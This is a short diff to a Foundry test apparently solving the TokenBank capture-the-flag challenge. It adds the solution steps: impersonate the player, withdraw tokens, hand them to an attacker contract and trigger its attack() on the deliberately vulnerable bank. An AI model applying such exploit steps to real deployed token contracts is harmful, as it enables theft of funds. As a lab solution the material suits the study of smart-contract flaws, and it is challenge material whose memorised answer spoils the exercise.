@@ -16,7 +16,10 @@ contract TankBankTest is Test {
         tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));
 
         // Put your solution here
-
+        vm.startPrank(player);
+        tokenBankChallenge.withdraw(500000 * 10**18);
+        tokenBankChallenge.token().transfer(address(tokenBankAttacker), 500000 * 10**18);
+        tokenBankAttacker.attack();
         _checkSolved();
     }
 
